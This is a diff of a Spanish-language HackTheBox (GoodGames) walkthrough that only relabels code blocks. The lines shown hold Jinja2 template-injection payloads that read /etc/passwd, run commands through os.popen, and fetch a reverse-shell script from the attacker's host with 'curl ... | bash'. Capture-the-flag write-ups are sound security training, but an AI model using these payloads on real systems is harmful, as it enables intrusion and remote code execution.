@@ -244,13 +244,13 @@ Y puedo ver la respuesta en el propio panel web.
 
 Estuve buscando información al respecto y encontré varios payloads que podrían servirme, asique probé uno de ellos para intentar leer el archivo passwd.
 
-```java
+```bash
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 A continuación probé un payload para intentar ejecutar comandos
 
-```java
+```bash
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
@@ -260,7 +260,7 @@ Y funciona, puedo ejecutar comandos en el sistema, por lo que creo una reverse s
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/shell.webp)
 
-```java
+```bash
 {{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.5:8081/rev.sh | bash').read()}}
 ```
 
